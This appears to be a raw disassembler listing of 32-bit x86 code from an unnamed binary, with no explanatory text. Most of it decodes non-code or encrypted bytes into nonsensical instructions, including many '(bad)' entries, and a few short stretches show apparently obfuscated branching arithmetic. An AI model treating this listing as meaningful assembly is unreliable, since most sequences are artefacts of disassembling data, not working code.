  40b2b8:	xchg   esi,eax
  40b2b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2ba:	pop    ds
  40b2bb:	pop    ecx
  40b2bc:	fiadd  DWORD PTR [eax-0x37]
  40b2bf:	ret    
  40b2c0:	inc    ebp
  40b2c1:	mov    cl,0x55
  40b2c3:	xchg   esp,eax
  40b2c4:	sbb    al,0x4b
  40b2c6:	mov    dh,0xe0
  40b2c8:	ds jp  0x40b2a5
  40b2cb:	loope  0x40b302
  40b2cd:	pop    ss
  40b2ce:	cmp    bl,BYTE PTR [esi]
  40b2d0:	and    eax,0xcf6ff89
  40b2d5:	add    edx,ebx
  40b2d7:	jmp    0xe86d:0x95b770d3
  40b2de:	inc    esi
  40b2df:	or     eax,0xa2a7ad55
  40b2e4:	add    DWORD PTR [esi-0x56],ecx
  40b2e7:	jp     0x40b2a5
  40b2e9:	lock stc 
  40b2eb:	mov    dl,0x73
  40b2ed:	xor    DWORD PTR [esi],0xffffff9a
  40b2f0:	xchg   ebx,eax
  40b2f1:	test   dl,ch
  40b2f3:	cmc    
  40b2f4:	fcmovnu st,st(3)
  40b2f6:	enter  0x6ffa,0xcd
  40b2fa:	jb     0x40b351
  40b2fc:	in     al,0xe2
  40b2fe:	out    dx,eax
  40b2ff:	sub    esi,ebp
  40b301:	and    cl,bl
  40b303:	ss push esp
  40b305:	xchg   DWORD PTR [ecx+edi*2+0x10],edx
  40b309:	ins    DWORD PTR es:[edi],dx
  40b30a:	sbb    eax,0xf9e348fe
  40b30f:	jne    0x40b2f6
  40b311:	out    0x45,eax
  40b313:	inc    esi
  40b314:	mov    ecx,0xf4c1ae63
  40b319:	call   FWORD PTR [esi+0x2e]
  40b31c:	fmul   DWORD PTR [edi+0x3efa6dc]
  40b322:	pushf  
  40b323:	inc    esp
  40b324:	mov    al,ds:0xaaacb270
  40b329:	mov    bl,0x9a
  40b32b:	cmp    eax,DWORD PTR ds:0x361a998e
  40b331:	int    0x4d
  40b333:	mov    edx,0x1d92fc05
  40b338:	fstp   DWORD PTR ds:0x161ecb5b
  40b33e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b33f:	push   0x55da120f
  40b344:	in     eax,dx
  40b345:	jb     0x40b2e9
  40b347:	inc    ecx
  40b348:	jle    0x40b2ef
  40b34a:	(bad)  
  40b34b:	in     al,dx
  40b34c:	xor    cl,BYTE PTR [eax+0x30]
  40b34f:	dec    edi
  40b350:	stos   BYTE PTR es:[edi],al
  40b351:	cmp    DWORD PTR [edx],ebx
  40b353:	fst    QWORD PTR [edx+0x3ff572d9]
  40b359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b35a:	out    dx,al
  40b35b:	mov    al,0xf9
  40b35d:	push   ecx
  40b35e:	jl     0x40b2ec
  40b360:	inc    esp
  40b361:	bound  ebp,QWORD PTR [esi-0x28]
  40b364:	pop    ecx
  40b365:	sbb    edi,ecx
  40b367:	test   DWORD PTR [ecx],esp
  40b369:	mov    ss,WORD PTR [ecx-0x2f7ba7da]
  40b36f:	out    dx,eax
  40b370:	test   DWORD PTR [esi+0x4978f2ef],esp
  40b376:	stc    
  40b377:	dec    ebx
  40b378:	popa   
  40b379:	cwde   
  40b37a:	imul   edi,DWORD PTR [eax-0x22],0x8bd76948
  40b381:	sub    DWORD PTR [eax],esp
  40b383:	mov    esp,0x1693ea8c
  40b388:	js     0x40b30f
  40b38a:	lds    esp,FWORD PTR [ecx-0x42]
  40b38d:	dec    ebx
  40b38e:	adc    BYTE PTR [ecx+0x3],ch
  40b391:	dec    ecx
  40b392:	jne    0x40b366
  40b394:	ror    edx,cl
  40b396:	adc    BYTE PTR [edx+0x49],dl
  40b399:	adc    eax,0x24dced50
  40b39e:	sbb    DWORD PTR [esi],ebx
  40b3a0:	sub    DWORD PTR [edx],edx
  40b3a2:	push   ecx
  40b3a3:	and    al,0x58
  40b3a5:	inc    edi
  40b3a6:	ins    DWORD PTR es:[edi],dx
  40b3a7:	cwde   
  40b3a8:	adc    DWORD PTR [esi+0x52],0xffffffcc
  40b3ac:	jbe    0x40b42d
  40b3ae:	and    al,0x3b
  40b3b0:	sbb    eax,0xf2c442cf
  40b3b5:	xchg   ebx,eax
  40b3b6:	js     0x40b3ac
  40b3b8:	mov    eax,0x187a46d4
  40b3bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3be:	push   es
  40b3bf:	inc    ecx
  40b3c0:	fs adc al,0x1e
  40b3c3:	test   al,al
  40b3c5:	out    dx,al
  40b3c6:	mov    ds:0x88d46236,eax
  40b3cb:	inc    esi
  40b3cc:	ror    DWORD PTR [ecx],1
  40b3ce:	jle    0x40b400
  40b3d0:	repz mov ebp,fs
  40b3d3:	xor    BYTE PTR [ecx+0x3c],0x75
  40b3d7:	sar    DWORD PTR [edi+0x466c53d6],cl
  40b3dd:	and    BYTE PTR [edx+esi*4+0x69520c75],bl
  40b3e4:	sbb    esp,DWORD PTR [edi]
  40b3e6:	mov    edx,0xf46409fc
  40b3eb:	cwde   
  40b3ec:	sbb    dh,al
  40b3ee:	and    edi,DWORD PTR [eax+0x4069a065]
  40b3f4:	iret   
  40b3f5:	cwde   
  40b3f6:	das    
  40b3f7:	out    dx,eax
  40b3f8:	add    DWORD PTR [eiz*8-0x77dfbcb1],esi
  40b3ff:	mov    ds:0xd92bcc23,eax
  40b404:	push   cs
  40b405:	rcr    DWORD PTR [edx-0x1e49f96c],cl
  40b40b:	add    DWORD PTR [eax+0x6f],ebx
  40b40e:	daa    
  40b40f:	mov    al,ds:0x2fd39f35
  40b414:	mov    bl,0x46
  40b416:	retf   0xa45f
  40b419:	sub    BYTE PTR [ebx],0x97
  40b41c:	aad    0x6b
  40b41e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b41f:	pop    ecx
  40b420:	push   edx
  40b421:	push   esp
  40b422:	sbb    ebp,DWORD PTR [ecx]
  40b424:	xor    al,0xb
  40b426:	(bad)  
  40b427:	push   ebx
  40b428:	and    DWORD PTR [ebx+0x59109f3c],esi
  40b42e:	retf   0xed31
  40b431:	scas   al,BYTE PTR es:[edi]
  40b432:	xchg   ebx,eax
  40b433:	call   0xc6f3:0x2ace93a5
  40b43a:	ins    BYTE PTR es:[edi],dx
  40b43b:	fwait
  40b43c:	cmp    al,0x75
  40b43e:	(bad)  
  40b440:	add    bl,BYTE PTR [esi-0x6e]
  40b443:	cmp    ecx,esp
  40b445:	jno    0x52bd7113
  40b44b:	adc    dl,BYTE PTR [edx-0x74]
  40b44e:	xchg   ebp,eax
  40b44f:	mov    bl,0x8b
  40b451:	js     0x40b471
  40b453:	ja     0x40b3d5
  40b455:	mov    cl,0xf4
  40b457:	cwde   
  40b458:	bound  esp,QWORD PTR [edx]
  40b45a:	cmp    esp,DWORD PTR ds:0x3ffa0a53
  40b460:	fs inc edi
  40b462:	call   0x44c0:0xac9fb85a
  40b469:	mov    bl,0x7d
  40b46b:	lods   eax,DWORD PTR ds:[esi]
  40b46c:	(bad)  
  40b46d:	retf   0x69dc
  40b470:	adc    DWORD PTR [esi-0x7d],ebp
  40b473:	loop   0x40b3f6
  40b475:	es je  0x40b41d
  40b478:	xchg   ebx,eax
  40b479:	xor    DWORD PTR [ebp+0x2f],esi
  40b47c:	clc    
  40b47d:	rcr    DWORD PTR [edx-0x2a],cl
  40b480:	push   edi
  40b481:	add    cl,cl
  40b483:	sbb    eax,0x9f18fc5e
  40b488:	sbb    al,0xb7
  40b48a:	loop   0x40b47c
  40b48c:	add    bl,BYTE PTR [ecx+0x4b1b77ef]
  40b492:	push   0xcc25d145
  40b497:	push   ds
  40b498:	pop    esp
  40b499:	cmp    BYTE PTR [ebp+0x64ef779d],dh
  40b49f:	or     al,0x2a
  40b4a1:	sbb    DWORD PTR [ecx+ebx*8-0x7469781a],ebp
  40b4a8:	clc    
  40b4a9:	push   edi
  40b4aa:	or     ebx,esi
  40b4ac:	sub    BYTE PTR [ecx-0x32aa948b],dl
  40b4b2:	jmp    0x40b48e
  40b4b4:	fwait
  40b4b5:	pop    edi
  40b4b6:	cmc    
  40b4b7:	sub    eax,0xc8531cfa
  40b4bc:	sbb    dl,BYTE PTR [ebx+esi*1-0x5713492b]
  40b4c3:	mov    al,0x2c
  40b4c5:	mov    BYTE PTR [ebp-0x7b66b242],0x5
  40b4cc:	iret   
  40b4cd:	les    ecx,FWORD PTR [ebx+0x39f417a5]
  40b4d3:	and    DWORD PTR [edx],eax
  40b4d5:	mov    edx,0xc6ec4fb5
  40b4da:	dec    BYTE PTR [eax]
  40b4dc:	cdq    
  40b4dd:	jecxz  0x40b480
  40b4df:	add    ebp,DWORD PTR [edi+0x69]
  40b4e2:	ret    0x33b6
  40b4e5:	cmp    BYTE PTR [eax-0x64],al
  40b4e8:	leave  
  40b4e9:	pop    edi
  40b4ea:	gs xchg ebp,eax
  40b4ec:	sub    dh,BYTE PTR [ecx+0x66ef0235]
  40b4f2:	call   0xd1ca5db
  40b4f7:	in     eax,0x74
  40b4f9:	xlat   BYTE PTR ds:[ebx]
  40b4fa:	ja     0x40b481
  40b4fc:	stos   DWORD PTR es:[edi],eax
  40b4fd:	add    BYTE PTR [edi+0x244f2afe],ah
  40b503:	fadd   QWORD PTR [edx-0x61ef8543]
  40b509:	popa   
  40b50a:	ror    DWORD PTR [eax-0x6d9f345],cl
  40b510:	fcomp  DWORD PTR [ebp-0x2f695cdd]
  40b516:	fucom  st(5)
  40b518:	scas   eax,DWORD PTR es:[edi]
  40b519:	dec    ecx
  40b51a:	sbb    al,0xe1
  40b51c:	into   
  40b51d:	arpl   dx,bx
  40b51f:	aad    0xf
  40b521:	scas   eax,DWORD PTR es:[edi]
  40b522:	xlat   BYTE PTR ds:[ebx]
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	ret    
  40b550:	icebp  
  40b551:	mov    edi,DWORD PTR [esi-0x3f]
  40b554:	xchg   BYTE PTR [eax+0x70],dh
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b5b3
  40b55c:	mov    bl,0x35
  40b55e:	fbld   TBYTE PTR [eax+0x4fe63bc]
  40b564:	retf   0x37a5
  40b567:	ins    DWORD PTR es:[edi],dx
  40b568:	adc    cl,dl
  40b56a:	and    al,0x78
  40b56c:	fcomp  QWORD PTR [eax-0x48]
  40b56f:	jmp    0x40b58a
  40b571:	lods   al,BYTE PTR ds:[esi]
  40b572:	gs jge 0x40b591
  40b575:	xor    ah,bh
  40b577:	and    BYTE PTR [ecx+0x364bdb72],ch
  40b57d:	dec    edi
  40b57e:	push   eax
  40b57f:	pop    ds
  40b580:	sbb    eax,0xaadeff29
  40b585:	sti    
  40b586:	ret    0x5d34
  40b589:	adc    cl,ch
  40b58b:	lahf   
  40b58c:	inc    ebp
  40b58d:	mov    esp,0xab83a74d
  40b592:	pop    ss
  40b593:	push   ebp
  40b594:	pop    eax
  40b595:	pop    edi
  40b596:	sbb    ah,ch
  40b598:	push   es
  40b599:	and    eax,0xfbd4ae9e
  40b59e:	imul   edx,DWORD PTR [ecx-0x5d],0xce00613
  40b5a5:	xor    eax,0xfa0c3bc0
  40b5aa:	mov    esp,0x308e78be
  40b5af:	popf   
  40b5b0:	mov    BYTE PTR [esp+ebp*1],bl
  40b5b3:	cld    
  40b5b4:	sub    al,0xee
  40b5b6:	int    0x19
  40b5b8:	test   eax,0xe6be35fb
  40b5bd:	or     bh,bl
  40b5bf:	(bad)  
  40b5c0:	cmc    
  40b5c1:	and    eax,DWORD PTR [ebp-0x70421a05]
  40b5c7:	xor    eax,0xdd7ba3c2
  40b5cc:	xchg   edx,eax
  40b5cd:	shl    DWORD PTR ds:0xffc0a88e,0xab
  40b5d4:	jne    0x40b605
  40b5d6:	int    0x48
  40b5d8:	push   0x33a98913
  40b5dd:	xchg   esi,eax
  40b5de:	sbb    DWORD PTR [ebx+0x29efae4e],ebp
  40b5e4:	repz dec DWORD PTR [eax]
  40b5e7:	and    bl,ah
  40b5e9:	push   esi
  40b5ea:	pushf  
  40b5eb:	ret    0x64a8
  40b5ee:	or     cl,BYTE PTR [ebp-0x50019a8e]
  40b5f4:	(bad)  
  40b5f5:	sti    
  40b5f6:	xchg   edx,eax
  40b5f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5f8:	stc    
  40b5f9:	cmp    BYTE PTR [eax+0x5c],0x67
  40b5fd:	mov    ah,0xf1
  40b5ff:	aad    0x88
  40b601:	push   es
  40b602:	pop    ss
  40b603:	jecxz  0x40b654
  40b605:	push   eax
  40b606:	sbb    BYTE PTR [eax+0x7d3db96b],ah
  40b60c:	push   ss
  40b60d:	out    0x1e,al
  40b60f:	jecxz  0x40b5e2
  40b611:	mov    esp,0x7ed89572
  40b616:	add    DWORD PTR [eax+0x38],edi
  40b619:	and    dl,BYTE PTR [esi+0x33980444]
  40b61f:	push   ds
  40b620:	mov    ds:0x8f28784,al
  40b625:	or     al,0xfb
  40b627:	pop    edi
  40b628:	lea    ecx,[edx+0x1d]
  40b62b:	pop    ebx
  40b62c:	repz push edi
  40b62e:	bound  esi,QWORD PTR [edx+edi*2-0x71]
  40b632:	enter  0x3bae,0xe5
  40b636:	and    al,0x31
  40b638:	cs ds nop
  40b63b:	mov    ebp,0x9a45adc9
  40b640:	dec    dh
  40b642:	pop    ebx
  40b643:	loopne 0x40b63e
  40b645:	mul    DWORD PTR [edi]
  40b647:	add    edx,DWORD PTR [eax-0x5cbb5fa1]
  40b64d:	dec    edx
  40b64e:	push   ebp
  40b64f:	pop    ss
  40b650:	push   0xa624bf4a
  40b655:	xchg   esp,eax
  40b656:	cmp    esp,edx
  40b658:	pop    edi
  40b659:	out    dx,eax
  40b65a:	jo     0x40b66a
  40b65c:	nop
  40b65d:	imul   edi,DWORD PTR [eax+esi*2],0x2c
  40b661:	mov    ?,esi
  40b663:	pop    esp
  40b664:	aad    0xe5
  40b666:	jns    0x40b6c7
  40b668:	mov    eax,fs
  40b66a:	(bad)  
  40b66b:	pop    ebx
  40b66c:	dec    ecx
  40b66d:	popa   
  40b66e:	pusha  
  40b66f:	(bad)  [edx+0x51]
  40b672:	ffreep st(6)
  40b674:	jp     0x40b666
  40b676:	adc    al,0x4b
  40b678:	sbb    BYTE PTR [ebp-0x3a01c0a1],dl
  40b67e:	ret    0x141e
  40b681:	adc    ebx,DWORD PTR [ebx+edi*4]
  40b684:	aas    
  40b685:	adc    DWORD PTR [ebx-0x2a0f50cf],ecx
  40b68b:	daa    
  40b68c:	out    0x7c,eax
  40b68e:	pop    ds
  40b68f:	fcomp  QWORD PTR [eax]
  40b691:	cdq    
  40b692:	dec    eax
  40b693:	cmp    BYTE PTR [eax-0x26],0xb5
  40b697:	pop    ecx
  40b698:	pop    edi
  40b699:	cmp    esp,DWORD PTR [eax+edx*8-0x5d656612]
  40b6a0:	fnsave [edx]
  40b6a2:	ficom  WORD PTR [ecx]
  40b6a4:	dec    ebx
  40b6a5:	mov    DWORD PTR [esi-0x3e],esi
  40b6a8:	outs   dx,BYTE PTR ds:[esi]
  40b6a9:	sbb    BYTE PTR [ecx-0x67a4f962],bl
  40b6af:	inc    edx
  40b6b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6b2:	mov    bh,al
  40b6b4:	or     dh,BYTE PTR [edi]
  40b6b6:	push   esi
  40b6b7:	(bad)  
  40b6b8:	(bad)  
  40b6ba:	push   esi
  40b6bb:	inc    BYTE PTR [eax]
  40b6bd:	mov    ch,0x97
  40b6bf:	bound  esi,QWORD PTR [ebp-0x68]
  40b6c2:	(bad)  
  40b6c3:	test   BYTE PTR [esi+0x69],0x9f
  40b6c7:	(bad)  
  40b6c8:	push   ss
  40b6c9:	out    0x51,al
  40b6cb:	jmp    0x40b691
  40b6cd:	ins    DWORD PTR es:[edi],dx
  40b6ce:	cmp    BYTE PTR [esi+edx*2-0x37],dl
  40b6d2:	fcomp  DWORD PTR [ebp-0x6]
  40b6d5:	shl    esp,0x16
  40b6d8:	push   ebp
  40b6d9:	pop    esp
  40b6da:	inc    ebp
  40b6db:	sub    eax,0xbcaf61fe
  40b6e0:	adc    ecx,esi
  40b6e2:	lock xchg esi,eax
  40b6e4:	and    edx,DWORD PTR [eax-0x28]
  40b6e7:	ja     0x40b6c0
  40b6e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6ea:	or     BYTE PTR [esi+0x22],0x3d
  40b6ee:	mov    al,0xf5
  40b6f0:	xchg   DWORD PTR [ecx+eax*8],esp
  40b6f3:	jmp    0xc464d2c7
  40b6f8:	in     eax,0x38
  40b6fa:	push   ebp
  40b6fb:	and    ch,dl
  40b6fd:	push   ebp
  40b6fe:	jmp    0x8a4:0x6f32ffde
  40b705:	xchg   edi,eax
  40b706:	fsub   QWORD PTR [ecx-0x426f0723]
  40b70c:	dec    ecx
  40b70d:	repz or al,0x80
  40b710:	inc    edi
  40b711:	scas   eax,DWORD PTR es:[edi]
  40b712:	test   DWORD PTR [edi],0xcc0eaf5c
  40b718:	test   eax,0xe568044f
  40b71d:	inc    BYTE PTR [ebx+esi*4-0xa]
  40b721:	cmp    edx,0x20
  40b724:	mov    ebx,0x670984ca
  40b729:	sti    
  40b72a:	ins    DWORD PTR es:[edi],dx
  40b72b:	inc    di
  40b72d:	mov    ds,WORD PTR [edi]
  40b72f:	pop    edx
  40b730:	cwde   
  40b731:	push   edx
  40b732:	ja     0x40b6bd
  40b734:	sub    BYTE PTR [esi-0x52],al
  40b737:	push   cs
  40b738:	lds    eax,FWORD PTR [esp+edx*8]
  40b73b:	dec    esp
  40b73c:	mov    ds:0x61fac202,eax
  40b741:	(bad)
  40b744:	mov    eax,ds:0x87fc498
  40b749:	clc    
  40b74a:	nop
  40b74b:	retf   
  40b74c:	ins    BYTE PTR es:[edi],dx
  40b74d:	das    
  40b74e:	add    BYTE PTR [ecx-0x3e],bl
  40b751:	nop
  40b752:	pop    eax
  40b753:	mov    al,0xd7
  40b755:	aaa    
  40b756:	sub    BYTE PTR [edx+0x1f],ch
  40b759:	(bad)  
  40b75a:	push   cs
  40b75b:	ins    BYTE PTR es:[edi],dx
  40b75c:	test   esp,0x581480eb
  40b762:	xor    dh,bl
  40b764:	add    ebp,ebp
  40b766:	lods   al,BYTE PTR ds:[esi]
  40b767:	or     ebx,edx
  40b769:	rcl    BYTE PTR [eax],cl
  40b76b:	bound  edx,QWORD PTR [edx+0xcb0fb4b]
  40b771:	cmp    al,0x77
  40b773:	fcmovnu st,st(2)
  40b775:	xor    dl,BYTE PTR [edi+0x24]
  40b778:	mov    WORD PTR [edi-0x67],?
  40b77b:	scas   eax,DWORD PTR es:[edi]
  40b77c:	push   ebx
  40b77d:	jns    0x40b771
  40b77f:	mov    ds:0xf165c64d,al
  40b784:	aaa    
  40b785:	(bad)  
  40b786:	int3   
  40b787:	retf   
  40b788:	das    
  40b789:	push   esi
  40b78a:	rcl    DWORD PTR [ecx+0x576d9568],1
  40b790:	mov    ds:0x8a31e08f,eax
  40b795:	loope  0x40b74e
  40b797:	mov    al,0xd
  40b799:	xchg   esp,eax
  40b79a:	push   es
  40b79b:	and    eax,0xbde58f66
  40b7a0:	test   eax,0xd8b942be
  40b7a5:	outs   dx,DWORD PTR ds:[esi]
  40b7a6:	dec    ebx
  40b7a7:	out    dx,al
  40b7a8:	ret    0x7b27
  40b7ab:	xchg   ebx,eax
  40b7ac:	dec    ebp
  40b7ad:	into   
  40b7ae:	dec    esi
  40b7af:	pop    ebx
  40b7b0:	push   cs
  40b7b1:	xor    eax,0x5e2f7857
  40b7b6:	and    ebx,edi
  40b7b8:	(bad)  
  40b7ba:	pop    edi
  40b7bb:	jne    0x40b7d0
  40b7bd:	or     al,0xe
  40b7bf:	repz sbb ecx,0xfffffff6
  40b7c3:	pop    ss
  40b7c4:	mov    al,0x51
  40b7c6:	mov    ecx,0x800d280d
  40b7cb:	inc    edi
  40b7cc:	test   BYTE PTR [eax+edi*4],0x12
  40b7d0:	aam    0x67
  40b7d2:	paddq  mm0,QWORD PTR [ebx+edx*2]
  40b7d6:	jnp    0x40b794
  40b7d8:	les    esp,FWORD PTR [eax+0x2]
  40b7db:	cli    
  40b7dc:	dec    edx
  40b7dd:	inc    esp
  40b7de:	icebp  
  40b7df:	fbstp  TBYTE PTR [ecx-0x6a]
  40b7e2:	scas   eax,DWORD PTR es:[edi]
  40b7e3:	into   
  40b7e4:	repz inc eax
  40b7e6:	dec    edx
  40b7e7:	pop    ebx
  40b7e8:	xor    eax,0xd78d4308
  40b7ed:	jmp    0x77179a96
  40b7f2:	mov    edx,0x43369160
  40b7f7:	mov    ds:0x3ac075de,eax
  40b7fc:	dec    ebp
  40b7fd:	(bad)  
  40b7fe:	sbb    edx,DWORD PTR [edi+0x59]
  40b801:	in     eax,0x2f
  40b803:	es sub eax,0x25a26374
  40b809:	pop    es
  40b80a:	das    
  40b80b:	adc    DWORD PTR [edi],edi
  40b80d:	pop    edx
  40b80e:	push   es
  40b80f:	or     dl,ch
  40b811:	jno    0x40b83c
  40b813:	addr16 enter 0xf45,0x6a
  40b818:	std    
  40b819:	inc    esi
  40b81a:	pushf  
  40b81b:	out    dx,al
  40b81c:	fcomp  DWORD PTR [eax+0x2af08cf9]
  40b822:	scas   al,BYTE PTR es:[edi]
  40b823:	test   eax,0xfb9aafc4
  40b828:	jl     0x40b7b8
  40b82a:	xchg   DWORD PTR [esi],edx
  40b82c:	jne    0x40b800
  40b82e:	adc    bh,BYTE PTR [ebx+0x50e15b6c]
  40b834:	mov    bl,0x79
  40b836:	mov    DWORD PTR [edx],eax
  40b838:	in     eax,0x5a
  40b83a:	enter  0x5858,0xd
  40b83e:	jecxz  0x40b80e
  40b840:	clc    
  40b841:	add    BYTE PTR [ebp+0x3f],bl
  40b844:	jbe    0x40b8b9
  40b846:	and    DWORD PTR [edx],0xcad11bc3
  40b84c:	mov    esi,0xde2fa08a
  40b851:	push   eax
  40b852:	aam    0x26
  40b854:	outs   dx,BYTE PTR ds:[esi]
  40b855:	sbb    ch,dh
  40b857:	xlat   BYTE PTR ds:[ebx]
  40b858:	int3   
  40b859:	pop    esp
  40b85a:	fcom   st(1)
  40b85c:	retf   
  40b85d:	das    
  40b85e:	push   ds
  40b85f:	adc    eax,ebp
  40b861:	fcmovne st,st(1)
  40b863:	cmc    
  40b864:	and    cl,0xee
  40b867:	adc    al,0x9a
  40b869:	adc    esi,DWORD PTR [eax-0x23]
  40b86c:	call   0x8666:0x1154bbe0
  40b873:	mov    edi,0x868a1c9d
  40b878:	and    DWORD PTR [edi+0x3c926aa8],eax
  40b87e:	cwde   
  40b87f:	sbb    edi,eax
  40b881:	cmc    
  40b882:	cli    
  40b883:	jl     0x40b846
  40b885:	test   eax,0x39a6a4d4
  40b88a:	jg     0x40b81f
  40b88c:	(bad)  
  40b88d:	nop
  40b88e:	shl    BYTE PTR [esi+0x27],0x9e
  40b892:	push   es
  40b893:	int    0xd5
  40b895:	sti    
  40b896:	retf   0x430c
  40b899:	adc    bl,BYTE PTR [edi+esi*2]
  40b89c:	pop    bp
  40b89e:	leave  
  40b89f:	xor    cl,BYTE PTR ds:[eax+0x6b]
  40b8a3:	or     dh,BYTE PTR [esi+0x7a]
  40b8a6:	or     ebp,DWORD PTR [eax-0x56]
  40b8a9:	mov    cl,0x79
  40b8ab:	mov    eax,0x3fec46f3
  40b8b0:	in     al,dx
  40b8b1:	sub    al,0xb
  40b8b3:	dec    ecx
  40b8b4:	sub    dl,0x5
  40b8b7:	jle    0x40b8e9
  40b8b9:	fldlg2 
  40b8bb:	xchg   edi,eax
  40b8bc:	cmp    eax,0x981c57e8
  40b8c1:	(bad)  
  40b8c2:	mov    eax,0xf9bc97cc
  40b8c7:	jnp    0x40b8ff
  40b8c9:	je     0x40b892
  40b8cb:	cli    
  40b8cc:	stc    
  40b8cd:	(bad)  
  40b8ce:	jbe    0x40b864
  40b8d0:	out    dx,eax
  40b8d1:	enter  0x2723,0xae
  40b8d5:	stc    
  40b8d6:	pushf  
  40b8d7:	lock sub BYTE PTR [edi],bl
  40b8da:	(bad)  
  40b8db:	jno    0x40b8ca
  40b8dd:	sub    dl,BYTE PTR [eax-0xe]
  40b8e0:	jl     0x40b949
  40b8e2:	xor    DWORD PTR [esi],ebx
  40b8e4:	mov    edi,0x3a56303f
  40b8e9:	mov    ds:0x4419772f,eax
  40b8ee:	fmul   DWORD PTR [ecx+0x198b519b]
  40b8f4:	pop    ebp
  40b8f5:	lahf   
  40b8f6:	mov    BYTE PTR [edx+0x4bd0d9ca],dl
  40b8fc:	mov    edi,DWORD PTR [ebp-0x4]
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx-0x26d59905],cl
  40b949:	jne    0x40b8e2
  40b94b:	pusha  
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b9b2
  40b954:	sti    
  40b955:	lock sbb DWORD PTR [ebp+0x10d6a7bf],edi
  40b95c:	call   0x87c95676
  40b961:	add    ebx,esi
  40b963:	cmp    esi,ebx
  40b965:	and    BYTE PTR [ecx-0x25],bl
  40b968:	xchg   ecx,eax
  40b969:	mov    ecx,0xb98ef346
  40b96e:	mov    ds:0xe088aaf5,eax
  40b973:	(bad)  
  40b974:	not    edi
  40b976:	outs   dx,BYTE PTR ds:[esi]
  40b977:	(bad)
  40b97b:	add    eax,0xf0b7d911
  40b980:	test   BYTE PTR [ebx],ah
  40b982:	out    dx,al
  40b983:	(bad)  
  40b984:	out    0x9f,eax
  40b986:	cmp    BYTE PTR ds:0x1fec358a,bh
  40b98c:	jp     0x40b9d2
  40b98e:	test   DWORD PTR [eax-0x10],0x57b3033f
  40b995:	shl    BYTE PTR [edx+edi*4+0x238286b3],1
  40b99c:	ficomp WORD PTR [esi+0x569c6324]
  40b9a2:	xor    dl,ch
  40b9a4:	xor    ebx,DWORD PTR [eax-0x1f]
  40b9a7:	inc    ebp
  40b9a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9a9:	aas    
  40b9aa:	xchg   edx,eax
  40b9ab:	aad    0x7c
  40b9ad:	cmp    DWORD PTR [eax],edi
  40b9af:	bnd jns 0x40b9dc
  40b9b2:	cmp    al,0xe4
  40b9b4:	dec    esp
  40b9b5:	mov    WORD PTR [ebp+0x30bc86c2],cs
  40b9bb:	mov    bl,0x7e
  40b9bd:	in     eax,0xd4
  40b9bf:	rol    DWORD PTR [edx-0x73],0xd4
  40b9c3:	and    edi,DWORD PTR [ebp+ebp*2+0x54]
  40b9c7:	inc    esi
  40b9c8:	mov    dh,0xb1
  40b9ca:	inc    ebx
  40b9cb:	add    DWORD PTR [esi+eax*4-0x5f63b249],ecx
  40b9d2:	mov    bh,cl
  40b9d4:	jl     0x40ba33
  40b9d6:	aad    0xf0
  40b9d8:	mov    ecx,0x3c54e5d9
  40b9dd:	xchg   esp,eax
  40b9de:	arpl   WORD PTR [ebp+0x529da9eb],si
  40b9e4:	ins    DWORD PTR es:[edi],dx
  40b9e5:	push   0x38dbee21
  40b9ea:	aam    0x5a
  40b9ec:	(bad)  [esi]
  40b9ee:	or     BYTE PTR [ebx-0x214b0da8],cl
  40b9f4:	cmp    BYTE PTR [esp+ecx*1],al
  40b9f7:	shl    BYTE PTR [ebx-0x56],cl
  40b9fa:	mov    bh,0x64
  40b9fc:	(bad)  
  40b9fd:	sub    al,0x74
  40b9ff:	leave  
  40ba00:	dec    edx
  40ba01:	adc    DWORD PTR [edi-0x24341fc8],eax
  40ba07:	sahf   
  40ba08:	adc    al,0x58
  40ba0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba0b:	in     eax,dx
  40ba0c:	and    cl,BYTE PTR [ebx+0x63afc20]
  40ba12:	and    esp,DWORD PTR [eax-0x8af57dc]
  40ba18:	or     BYTE PTR [esp+ebp*8-0x268f0fda],bh
  40ba1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba20:	test   eax,0x6efce4d6
  40ba25:	pop    edx
  40ba26:	aam    0x67
